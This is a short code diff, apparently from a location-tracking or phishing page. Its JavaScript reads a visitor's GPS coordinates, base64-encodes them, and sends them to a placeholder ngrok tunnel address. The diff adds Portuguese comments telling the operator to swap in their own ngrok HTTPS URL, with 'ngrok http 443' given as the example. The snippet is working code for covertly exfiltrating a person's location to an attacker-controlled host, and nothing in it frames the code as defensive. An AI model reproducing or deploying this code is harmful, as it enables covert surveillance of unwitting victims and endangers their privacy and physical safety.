@@ -26,6 +26,8 @@
         navigator.geolocation.getCurrentPosition(function(position){
             var gps = btoa(position.coords.latitude + "," + position.coords.longitude);
             var xhttp = new XMLHttpRequest();
+            // Substituindo o NGROK-HTTPS pelo endereço ngrok em https que você subiu
+            // Ex: $ ngrok http 443
             xhttp.open("GET","NGROK-HTTPS/?addr="+gps);
             xhttp.send();
         });
